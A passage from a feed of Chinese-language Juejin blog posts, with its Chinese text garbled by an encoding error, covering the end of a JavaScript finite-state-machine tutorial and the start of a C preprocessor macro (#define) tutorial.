<li>æ°¸è¿œä¸è¦ç›´æ¥æ”¹<code>currentState</code>ï¼šæ¯”å¦‚ä¸è¦å†™<code>loadDataFSM.currentState = "success"</code>ï¼Œå¿…é¡»é€šè¿‡<code>trigger</code>è§¦å‘ï¼Œå¦åˆ™ä¼šç»•è¿‡è§„åˆ™æ ¡éªŒã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-9">äº”ã€æ‰©å±•ï¼šæ›´é€šç”¨çš„çŠ¶æ€æœºç±»ï¼ˆå¯å¤ç”¨ï¼‰</h3>
<p>å¦‚æœå¤šä¸ªåœºæ™¯è¦ç”¨çŠ¶æ€æœºï¼Œå¯å°è£…æˆç±»ï¼Œå¤ç”¨æ€§æ›´é«˜ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// é€šç”¨çŠ¶æ€æœºç±» </span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleFSM</span> { 
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">initialState, rules, onChange</span>) { 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span> = initialState; <span class="hljs-comment">// åˆå§‹çŠ¶æ€ </span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span> = rules; <span class="hljs-comment">// åˆ‡æ¢è§„åˆ™ </span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onChange</span> = onChange; <span class="hljs-comment">// çŠ¶æ€å˜æ›´å›è°ƒ </span>
    } 
    <span class="hljs-comment">// è§¦å‘çŠ¶æ€åˆ‡æ¢ </span>
    <span class="hljs-title function_">trigger</span>(<span class="hljs-params">event, payload</span>) { 
        <span class="hljs-keyword">const</span> nextState = <span class="hljs-variable language_">this</span>.<span class="hljs-property">rules</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span>]?.[event]; 
        <span class="hljs-keyword">if</span> (!nextState) { 
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">`âŒ éæ³•æ“ä½œï¼š<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.currentState}</span> â†’ <span class="hljs-subst">${event}</span>`</span>); 
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; 
        } 
        <span class="hljs-keyword">const</span> oldState = <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span>; 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span> = nextState; 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onChange</span>?.(nextState, oldState, payload); <span class="hljs-comment">// æ‰§è¡Œå›è°ƒ </span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; 
    } 
    <span class="hljs-comment">// è·å–å½“å‰çŠ¶æ€ </span>
    <span class="hljs-title function_">getState</span>(<span class="hljs-params"/>) { 
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentState</span>; 
    } 
}
<span class="hljs-comment">// ç”¨æ³•ï¼šåˆ›å»ºä¸€ä¸ªå¼¹çª—çŠ¶æ€æœº </span>
<span class="hljs-keyword">const</span> modalFSM = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleFSM</span>( 
   <span class="hljs-string">"closed"</span>, <span class="hljs-comment">// åˆå§‹çŠ¶æ€ï¼šå…³é—­ </span>
   <span class="hljs-comment">// åˆ‡æ¢è§„åˆ™ </span>
   { 
       <span class="hljs-attr">closed</span>: { <span class="hljs-attr">open</span>: <span class="hljs-string">"opened"</span> }, 
       <span class="hljs-attr">opened</span>: { <span class="hljs-attr">close</span>: <span class="hljs-string">"closed"</span>, <span class="hljs-attr">confirm</span>: <span class="hljs-string">"closed"</span> } 
   }, 
   <span class="hljs-comment">// çŠ¶æ€å˜æ›´å›è°ƒï¼ˆæ›´æ–°å¼¹çª—UIï¼‰ </span>
   <span class="hljs-function">(<span class="hljs-params">newState</span>) =&gt;</span> { 
       <span class="hljs-keyword">const</span> modal = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"modal"</span>); 
       modal.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = newState === <span class="hljs-string">"opened"</span> ? <span class="hljs-string">"block"</span> : <span class="hljs-string">"none"</span>; 
   } 
   );
  <span class="hljs-comment">// è°ƒç”¨ç¤ºä¾‹ </span>
  modalFSM.<span class="hljs-title function_">trigger</span>(<span class="hljs-string">"open"</span>); <span class="hljs-comment">// æ‰“å¼€å¼¹çª— </span>
  modalFSM.<span class="hljs-title function_">trigger</span>(<span class="hljs-string">"confirm"</span>);<span class="hljs-comment">// ç¡®è®¤å…³é—­å¼¹çª— </span>
  modalFSM.<span class="hljs-title function_">trigger</span>(<span class="hljs-string">"open"</span>); <span class="hljs-comment">// éæ³•æ“ä½œï¼šclosedæ€æ‰èƒ½openï¼Œopenedæ€ä¸è¡Œï¼Œä¼šæç¤º</span>
</code></pre>
<hr/>
<h3 data-id="heading-10">æ€»ç»“ï¼ˆå…³é”®ç‚¹å›é¡¾ï¼‰</h3>
<ol>
<li><strong>çŠ¶æ€æœºæ ¸å¿ƒä¸‰è¦ç´ </strong>ï¼šçŠ¶æ€ï¼ˆå½“å‰èº«ä»½ï¼‰ã€äº‹ä»¶ï¼ˆè§¦å‘åŠ¨ä½œï¼‰ã€è§„åˆ™ï¼ˆåˆ‡æ¢é€»è¾‘ï¼‰ï¼›</li>
<li><strong>è®¾è®¡æ¨¡å¼æ ¸å¿ƒ</strong>ï¼šä¸€ä¸ªå”¯ä¸€çš„åˆ‡æ¢å…¥å£ï¼ˆ<code>trigger</code>ï¼‰+ æ˜¾æ€§çš„è§„åˆ™ï¼ˆ<code>rules</code>ï¼‰+ åˆ†ç¦»çš„ä¸šåŠ¡é€»è¾‘ï¼ˆ<code>onChange</code>ï¼‰ï¼›</li>
<li><strong>æ ¸å¿ƒå¥½å¤„</strong>ï¼šæ‹¦æˆªéæ³•æ“ä½œã€é¿å…çŠ¶æ€æ··ä¹±ã€é€»è¾‘æ¸…æ™°æ˜“ç»´æŠ¤ï¼Œå“ªæ€•æ˜¯ç®€å•åœºæ™¯ä¹Ÿèƒ½å°‘å†™bugã€‚ è¿™ä¸ªè®¾è®¡æ¨¡å¼ä¸ç”¨ä¾èµ–ä»»ä½•ç¬¬ä¸‰æ–¹åº“ï¼Œçº¯åŸç”ŸJSå°±èƒ½å®ç°ï¼Œæ–°æ‰‹ä¹Ÿèƒ½å¿«é€Ÿä¸Šæ‰‹ï¼Œæ˜¯å‰ç«¯çŠ¶æ€æœºæœ€åŸºç¡€ã€æœ€æ˜“æ‡‚çš„å†™æ³•ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[cè¯­è¨€å®å®šä¹‰è¯¦ç»†è®²è§£ï¼Œä»¥åŠå®æ“è¿…é€Ÿç†è§£æŒæ¡]]></title>    <link>https://juejin.cn/post/7603043152672505871</link>    <guid>https://juejin.cn/post/7603043152672505871</guid>    <pubDate>2026-02-05T09:39:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603043152672505871" data-draft-id="7602916013877526543" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="cè¯­è¨€å®å®šä¹‰è¯¦ç»†è®²è§£ï¼Œä»¥åŠå®æ“è¿…é€Ÿç†è§£æŒæ¡"/> <meta itemprop="keywords" content="åµŒå…¥å¼"/> <meta itemprop="datePublished" content="2026-02-05T09:39:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ­ªæ¯”å·´åœ273"/> <meta itemprop="url" content="https://juejin.cn/user/2578802574264489"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            cè¯­è¨€å®å®šä¹‰è¯¦ç»†è®²è§£ï¼Œä»¥åŠå®æ“è¿…é€Ÿç†è§£æŒæ¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2578802574264489/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ­ªæ¯”å·´åœ273
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:39:23.000Z" title="Thu Feb 05 2026 09:39:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body .octicon{display:inline-block;fill:currentColor;vertical-align:text-bottom}.markdown-body .anchor{float:left;line-height:1;margin-left:-20px;padding-right:4px}.markdown-body .anchor:focus{outline:none}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#1b1f23;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1:hover .anchor .octicon-link:before,.markdown-body h2:hover .anchor .octicon-link:before,.markdown-body h3:hover .anchor .octicon-link:before,.markdown-body h4:hover .anchor .octicon-link:before,.markdown-body h5:hover .anchor .octicon-link:before,.markdown-body h6:hover .anchor .octicon-link:before{width:16px;height:16px;content:" ";display:inline-block;background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' aria-hidden='true'%3E%3Cpath fill-rule='evenodd' d='M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z'/%3E%3C/svg%3E")}.markdown-body{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;color:#24292e;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body details{display:block}.markdown-body summary{display:list-item}.markdown-body a{background-color:initial}.markdown-body a:active,.markdown-body a:hover{outline-width:0}.markdown-body strong{font-weight:inherit;font-weight:bolder}.markdown-body h1{margin:.67em 0}.markdown-body img{border-style:none}.markdown-body code,.markdown-body kbd,.markdown-body pre{font-family:monospace,monospace;font-size:1em}.markdown-body hr{box-sizing:initial;overflow:visible}.markdown-body input{font:inherit;margin:0;overflow:visible}.markdown-body [type=checkbox]{box-sizing:border-box;padding:0}.markdown-body *{box-sizing:border-box}.markdown-body input{font-family:inherit;font-size:inherit;line-height:inherit}.markdown-body a{color:#0366d6;text-decoration:none}.markdown-body a:hover{text-decoration:underline}.markdown-body strong{font-weight:600}.markdown-body hr{height:0;margin:15px 0;overflow:hidden;background:transparent;border-bottom:1px solid #dfe2e5}.markdown-body hr:after,.markdown-body hr:before{display:table;content:""}.markdown-body hr:after{clear:both}.markdown-body table{border-spacing:0;border-collapse:collapse}.markdown-body td,.markdown-body th{padding:0}.markdown-body details summary{cursor:pointer}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:0;margin-bottom:0}.markdown-body h1{font-size:32px}.markdown-body h1,.markdown-body h2{font-weight:600}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:20px}.markdown-body h3,.markdown-body h4{font-weight:600}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:14px}.markdown-body h5,.markdown-body h6{font-weight:600}.markdown-body h6{font-size:12px}.markdown-body p{margin-top:0;margin-bottom:10px}.markdown-body blockquote{margin:0}.markdown-body ol,.markdown-body ul{padding-left:0;margin-top:0;margin-bottom:0}.markdown-body ol ol,.markdown-body ul ol{list-style-type:lower-roman}.markdown-body ol ol ol,.markdown-body ol ul ol,.markdown-body ul ol ol,.markdown-body ul ul ol{list-style-type:lower-alpha}.markdown-body dd{margin-left:0}.markdown-body code,.markdown-body pre{font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px}.markdown-body pre{margin-top:0;margin-bottom:0}.markdown-body input::-webkit-inner-spin-button,.markdown-body input::-webkit-outer-spin-button{margin:0;-webkit-appearance:none;appearance:none}.markdown-body :checked+.radio-label{position:relative;z-index:1;border-color:#0366d6}.markdown-body .border{border:1px solid #e1e4e8!important}.markdown-body .border-0{border:0!important}.markdown-body .border-bottom{border-bottom:1px solid #e1e4e8!important}.markdown-body .rounded-1{border-radius:3px!important}.markdown-body .bg-white{background-color:#fff!important}.markdown-body .bg-gray-light{background-color:#fafbfc!important}.markdown-body .text-gray-light{color:#6a737d!important}.markdown-body .pl-3,.markdown-body .px-3{padding-left:16px!important}.markdown-body .px-3{padding-right:16px!important}.markdown-body .f6{font-size:12px!important}.markdown-body .lh-condensed{line-height:1.25!important}.markdown-body .text-bold{font-weight:600!important}.markdown-body .pl-c{color:#6a737d}.markdown-body .pl-c1,.markdown-body .pl-s .pl-v{color:#005cc5}.markdown-body .pl-e,.markdown-body .pl-en{color:#6f42c1}.markdown-body .pl-s .pl-s1,.markdown-body .pl-smi{color:#24292e}.markdown-body .pl-ent{color:#22863a}.markdown-body .pl-k{color:#d73a49}.markdown-body .pl-pds,.markdown-body .pl-s,.markdown-body .pl-s .pl-pse .pl-s1,.markdown-body .pl-sr,.markdown-body .pl-sr .pl-cce,.markdown-body .pl-sr .pl-sra,.markdown-body .pl-sr .pl-sre{color:#032f62}.markdown-body .pl-smw,.markdown-body .pl-v{color:#e36209}.markdown-body .pl-bu{color:#b31d28}.markdown-body .pl-ii{color:#fafbfc;background-color:#b31d28}.markdown-body .pl-c2{color:#fafbfc;background-color:#d73a49}.markdown-body .pl-c2:before{content:"^M"}.markdown-body .pl-sr .pl-cce{font-weight:700;color:#22863a}.markdown-body .pl-ml{color:#735c0f}.markdown-body .pl-mh,.markdown-body .pl-mh .pl-en,.markdown-body .pl-ms{font-weight:700;color:#005cc5}.markdown-body .pl-mi{font-style:italic;color:#24292e}.markdown-body .pl-mb{font-weight:700;color:#24292e}.markdown-body .pl-md{color:#b31d28;background-color:#ffeef0}.markdown-body .pl-mi1{color:#22863a;background-color:#f0fff4}.markdown-body .pl-mc{color:#e36209;background-color:#ffebda}.markdown-body .pl-mi2{color:#f6f8fa;background-color:#005cc5}.markdown-body .pl-mdr{font-weight:700;color:#6f42c1}.markdown-body .pl-ba{color:#586069}.markdown-body .pl-sg{color:#959da5}.markdown-body .pl-corl{text-decoration:underline;color:#032f62}.markdown-body .mb-0{margin-bottom:0!important}.markdown-body .my-2{margin-bottom:8px!important;margin-top:8px!important}.markdown-body .pl-0{padding-left:0!important}.markdown-body .py-0{padding-top:0!important;padding-bottom:0!important}.markdown-body .pl-1{padding-left:4px!important}.markdown-body .pl-2{padding-left:8px!important}.markdown-body .py-2{padding-top:8px!important;padding-bottom:8px!important}.markdown-body .pl-3{padding-left:16px!important}.markdown-body .pl-4{padding-left:24px!important}.markdown-body .pl-5{padding-left:32px!important}.markdown-body .pl-6{padding-left:40px!important}.markdown-body .pl-7{padding-left:48px!important}.markdown-body .pl-8{padding-left:64px!important}.markdown-body .pl-9{padding-left:80px!important}.markdown-body .pl-10{padding-left:96px!important}.markdown-body .pl-11{padding-left:112px!important}.markdown-body .pl-12{padding-left:128px!important}.markdown-body hr{border-bottom-color:#eee}.markdown-body kbd{display:inline-block;padding:3px 5px;font:11px SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;line-height:10px;color:#444d56;vertical-align:middle;background-color:#fafbfc;border:1px solid #d1d5da;border-radius:3px;box-shadow:inset 0 -1px 0 #d1d5da}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body&gt;:first-child{margin-top:0!important}.markdown-body&gt;:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body blockquote,.markdown-body details,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e1e4e8;border:0}.markdown-body blockquote{padding:0 1em;color:#6a737d;border-left:.25em solid #dfe2e5}.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eaecef}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#6a737d}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li{word-wrap:break-all}.markdown-body li&gt;p{margin-top:16px}.markdown-body li+li{margin-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:600}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto}.markdown-body table th{font-weight:600}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #dfe2e5}.markdown-body table tr{background-color:#fff;border-top:1px solid #c6cbd1}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}.markdown-body img{max-width:100%;box-sizing:initial;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body code{padding:.2em .4em;margin:0;font-size:85%;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body pre{word-wrap:normal}.markdown-body pre&gt;code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f6f8fa;border-radius:3px}.markdown-body pre code{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:initial;border:0}.markdown-body .commit-tease-sha{display:inline-block;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:90%;color:#444d56}.markdown-body .full-commit .btn-outline:not(:disabled):hover{color:#005cc5;border-color:#005cc5}.markdown-body .blob-wrapper{overflow-x:auto;overflow-y:hidden}.markdown-body .blob-wrapper-embedded{max-height:240px;overflow-y:auto}.markdown-body .blob-num{width:1%;min-width:50px;padding-right:10px;padding-left:10px;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;line-height:20px;color:rgba(27,31,35,.3);text-align:right;white-space:nowrap;vertical-align:top;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-body .blob-num:hover{color:rgba(27,31,35,.6)}.markdown-body .blob-num:before{content:attr(data-line-number)}.markdown-body .blob-code{position:relative;padding-right:10px;padding-left:10px;line-height:20px;vertical-align:top}.markdown-body .blob-code-inner{overflow:visible;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;color:#24292e;word-wrap:normal;white-space:pre}.markdown-body .pl-token.active,.markdown-body .pl-token:hover{cursor:pointer;background:#ffea7f}.markdown-body .tab-size[data-tab-size="1"]{-moz-tab-size:1;tab-size:1}.markdown-body .tab-size[data-tab-size="2"]{-moz-tab-size:2;tab-size:2}.markdown-body .tab-size[data-tab-size="3"]{-moz-tab-size:3;tab-size:3}.markdown-body .tab-size[data-tab-size="4"]{-moz-tab-size:4;tab-size:4}.markdown-body .tab-size[data-tab-size="5"]{-moz-tab-size:5;tab-size:5}.markdown-body .tab-size[data-tab-size="6"]{-moz-tab-size:6;tab-size:6}.markdown-body .tab-size[data-tab-size="7"]{-moz-tab-size:7;tab-size:7}.markdown-body .tab-size[data-tab-size="8"]{-moz-tab-size:8;tab-size:8}.markdown-body .tab-size[data-tab-size="9"]{-moz-tab-size:9;tab-size:9}.markdown-body .tab-size[data-tab-size="10"]{-moz-tab-size:10;tab-size:10}.markdown-body .tab-size[data-tab-size="11"]{-moz-tab-size:11;tab-size:11}.markdown-body .tab-size[data-tab-size="12"]{-moz-tab-size:12;tab-size:12}.markdown-body .task-list-item{list-style-type:none}.markdown-body .task-list-item+.task-list-item{margin-top:3px}.markdown-body .task-list-item input{margin:0 .2em .25em -1.6em;vertical-align:middle}</style><style data-highlight="" data-highlight-key="github">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬åšå®¢åˆ†ä¸ºä»¥ä¸‹ä¸‰ä¸ªéƒ¨åˆ†ï¼Œå¦‚æœäº†è§£å®å®šä¹‰çš„å¯ä»¥ç›´æ¥åˆ°å®çš„å‡½æ•°å®šä¹‰å¼ æ°çœ‹çœ‹æ³›å‹å’ŒæŠ€å·§</p>
<ol>
<li>å®å®šä¹‰è®²è§£å’Œä»‹ç»</li>
<li>å®å®šä¹‰æå‡</li>
<li>å®å®šä¹‰å®è·µå®ç°ä¸€ä¸ªè‡ªç¼–å†™æŠ¥é”™</li>
</ol>
<h2 data-id="heading-0">å®å®šä¹‰è®²è§£å’Œä»‹ç»</h2>
<h4 data-id="heading-1">é¦–å…ˆä»€ä¹ˆæ˜¯å®å®šä¹‰ï¼Ÿï¼Ÿ</h4>
<p>å®å®šä¹‰æœ¬è´¨å¯ä»¥ç†è§£æˆä¸€ç§<strong>æ–‡æœ¬æ›¿æ¢</strong>ï¼Œæ–‡æœ¬æ›¿æ¢å°±æ˜¯æŠŠä½ è¿™ä¸ªä¸œè¥¿ç›´æ¥å¤åˆ¶åˆ°ä½¿ç”¨çš„ä½ç½®ï¼Œ<strong>æ³¨æ„æ–‡æœ¬æ›¿æ¢æ˜¯é‡ç‚¹</strong>ï¼Œä½†æ˜¯è¿™å…ˆä¸è¯´æˆ‘ä»¬å…ˆè¯´å®å®šä¹‰çš„ä¸¤ç§æ ¼å¼</p>
<ol>
<li>å¯¹è±¡å¼å®šä¹‰(å…¶å®å°±æ˜¯å®šä¹‰ä¸€ä¸ªå¯¹è±¡)</li>
<li>å‡½æ•°å¼å®šä¹‰(å…¶å®å°±æ˜¯å®šä¹‰ä¸€ä¸ªå‡½æ•°)</li>
</ol>
<h3 data-id="heading-2">1.å¯¹è±¡å¼å®šä¹‰</h3>
<p>æˆ‘ä»¬å…ˆæ¥çœ‹å¯¹è±¡å¼å®šä¹‰ï¼Œä¹Ÿå°±æ˜¯å®šä¹‰ä¸€ä¸ªå¯¹è±¡è¯­æ³•ä¸Šæ ¼å¼ä¸º
<code>#define å®å®šä¹‰å å€¼</code>ï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¾‹å­ï¼Œ<strong>æ³¨æ„è¿™ä¸ªå€¼å¿…é¡»æ˜¯å¸¸é‡</strong></p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PI 3.14<span class="hljs-comment">//PIä»£è¡¨åœ†å‘¨ç‡é‚£è¿ç®—æˆ‘ä»¬å°±å¯ä»¥å†™æˆ</span></span>
s=r*r*PI;
</code></pre>
<p>é‚£ä½¿ç”¨å®å®šä¹‰å†™çš„å¥½å¤„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p><strong>å®ç”¨åŸå› ï¼š
1.å®¹æ˜“è¯»æ‡‚</strong> ä½ çœ‹è¿™ä¸ªå®å®šä¹‰åå­—å°±çŸ¥é“å®ƒä»£è¡¨çš„å†…å®¹</p>
<p><strong>2.æ–¹ä¾¿ä¿®æ”¹ï¼š</strong> ä¾‹å¦‚ï¼Œè®¡ç®—å¤šç»„åœ†çš„é¢ç§¯,çœ‹ä¸‹é¢ä¾‹å­</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">//å‡è®¾ä¸ä½¿ç”¨è¿™ä¸ªå®å®šä¹‰è€Œæ˜¯ç›´æ¥ç”¨ä¸€ä¸ªæ•°ä»£è¡¨åœ†å‘¨ç‡</span>
s1=r1*r2*<span class="hljs-number">3.14</span>,s2=r2*r2*<span class="hljs-number">3.14</span>,s3=r3*r3*<span class="hljs-number">3.14</span>;
<span class="hljs-comment">//ä½¿ç”¨å®å®šä¹‰</span>
s1=r1*r2*PI,s2=r2*r2*PI,s3=r3*r3*PI;
</code></pre>
<p>å½“æˆ‘æ„Ÿè§‰PIç²¾åº¦ä¸å¤Ÿéœ€è¦ä»3.14æ¢æˆè¿™ä¸ª3.141592çš„æ—¶å€™ï¼Œç¬¬ä¸€ç§å°±éœ€è¦ä¸€ä¸ªä¸ªä¿®æ”¹å¦‚æœæ˜¯ä½¿ç”¨å®å®šä¹‰ç›´æ¥ä¿®æ”¹#define PI 3.141592;å³å¯</p>
<p>é‚£ä½¿ç”¨å®då¯¹è±¡å®šä¹‰æœ‰ä»€ä¹ˆåå¤„å—ï¼Ÿ
æœ‰çš„æœ‰çš„å…„å¼Ÿï¼Œé¦–å…ˆæˆ‘ä»¬<strong>æŠ“ä½å®ƒæ–‡æœ¬æ›¿æ¢çš„ç‰¹ç‚¹</strong>é‚£ä¹ˆå°±å†³å®šäº†å®ƒ</p>
<ol>
<li>æœ¬èº«æ˜¯æ–‡æœ¬ä¸æ˜¯å˜é‡æ²¡æœ‰ç±»å‹</li>
<li>æ²¡æœ‰è¿™ä¸ªä½œç”¨åŸŸï¼Œä½¿ç”¨#undefç»ˆæ­¢</li>
<li>æ²¡æœ‰å†…å­˜åˆ†é…</li>
